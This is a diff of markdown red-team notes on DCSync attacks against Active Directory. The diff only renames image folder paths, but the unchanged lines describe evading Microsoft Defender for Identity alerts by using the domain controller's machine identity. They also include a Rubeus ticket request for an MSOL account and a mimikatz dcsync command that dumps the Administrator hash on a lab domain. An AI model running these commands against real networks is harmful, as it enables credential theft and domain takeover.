@@ -2,9 +2,9 @@
 - DCSync: it uses the Directory Replication Service to request from a DC to synchronize a specified entry.
 - DCSync is less prone to detection by AV/EDR but MDI detects it.
 - MDI alerts:
-![](imgachments/Pasted%20image%2020260417095944.png)
+![](img/Pasted%20image%2020260417095944.png)
 
-![](imgachments/Pasted%20image%2020260417095956.png)
+![](img/Pasted%20image%2020260417095956.png)
 To bypass MDI detection:
 - Avoid suspicious logs and bypass MDI by using Domain Controller identity (domain-dc$).
 - Hybrid identity:
@@ -24,8 +24,8 @@ Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:MSOL_9c658791b701 /
 mimikatz.exe "lsadump::dcsync /user:Administrator /dc:dc01.yhp0w.lan /domain:yhp0w.lan" "exit"
 ```
 
-![](imgachments/Pasted%20image%2020260421153243.png)
+![](img/Pasted%20image%2020260421153243.png)
 
-![](imgachments/Pasted%20image%2020260421153313.png)
+![](img/Pasted%20image%2020260421153313.png)
 
 
